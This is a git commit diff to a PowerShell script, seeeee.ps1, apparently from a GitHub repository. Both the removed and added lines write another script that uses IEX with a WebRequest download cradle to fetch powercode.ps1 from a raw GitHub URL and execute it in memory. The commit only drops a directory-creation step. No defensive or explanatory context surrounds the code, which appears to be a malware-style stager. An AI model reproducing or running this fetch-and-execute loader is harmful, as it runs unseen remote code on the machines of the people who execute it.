2d88ca9353a15be380c594d5ec513f859d22bbbd
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-23 16:01:52 -0500

    Update seeeee.ps1

--- seeeee.ps1
+++ seeeee.ps1
@@ -1,1 +1,1 @@
-md C:\Users\User\Downloads\ser; Set-Content serseruex.ps1 'IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create("https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1").GetResponse().GetResponseStream()).ReadToEnd());' -Encoding ASCII;
+Set-Content serseruex.ps1 'IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create("https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1").GetResponse().GetResponseStream()).ReadToEnd());' -Encoding ASCII;
